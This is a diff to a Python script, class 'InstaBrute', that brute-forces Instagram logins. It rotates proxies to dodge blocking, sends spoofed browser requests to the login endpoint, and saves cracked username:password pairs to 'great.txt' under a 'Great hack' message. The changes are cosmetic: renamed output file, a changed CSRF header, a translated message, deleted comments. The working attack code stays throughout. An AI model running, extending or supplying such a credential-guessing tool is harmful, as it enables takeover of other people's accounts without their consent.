@@ -1,5 +1,5 @@
-from __future__ import absolute_import
 from __future__ import print_function
+from __future__ import absolute_import
 import requests, sys, threading, time, os, random
 import json
 from colorama import Fore
@@ -68,17 +68,13 @@ class InstaBrute(object):
                 print('')
                 print(normal_color+'[*] Check new ip...')
                 response = requests.get('https://api.ipify.org/?format=raw', proxies={"http": proxy, "https": proxy},
-                                        timeout=10.0).text
+					timeout=10.0).text
                 if re.match(r'((?:\d{1,3}\.){3}\d{1,3})', response) != None:
                     print(whiteB_color + '[*] Your public ip: %s' % response)
                     print('')
                     break
                 else:
                     continue
-                # if response.rtrim().ltrim() == "HTTP/1.1 400 Bad Request":
-                #     raise Exception("Can not reach proxy")
-                # else:
-                #     break
             except Exception as e:
                 print('[*] Can\'t reach proxy "%s"' % proxy)
                 proxy = random.choice(plist)
@@ -108,26 +104,26 @@ class InstaBrute(object):
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
                 "X-Requested-With": "XMLHttpRequest",
                 "Referer": "https://www.instagram.com/accounts/login/",
-                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
+                "csrf_token": 'DXqibEccwosJBGGL2NlW5VVM6pkkxh6E'
             })
 
             
             data = json.loads(r.text)
             if 'message' in r.text:
                 print('----------------------------')
-                print(red_color+'--> not proxy تحتاج بروكسي')
+                print(red_color+'--> not proxy, need a proxy')
                 UsePorxy = self.randomProxy()
                 print (whiteB_color + 'username: '+ user + ' | '' password: '+ pwd )
                 print(r.text)
                 print('----------------------------')
             if 'checkpoint_url' in r.text:
-                print((normal_color+'' + user + ':' + pwd + ' --> Good hack '))
-                with open('good.txt', 'a') as x:
+                print((normal_color+'' + user + ':' + pwd + ' --> Great hack '))
+                with open('great.txt', 'a') as x:
                     x.write(user + ':' + pwd + '\n')
                     exit()					
             if 'userId' in r.text:
-                print((normal_color+'' + user + ':' + pwd + ' --> Good hack '))
-                with open('good.txt', 'a') as x:
+                print((normal_color+'' + user + ':' + pwd + ' --> Great hack '))
+                with open('great.txt', 'a') as x:
                     x.write(user + ':' + pwd + '\n')
                     exit()
             elif 'status' in r.text:
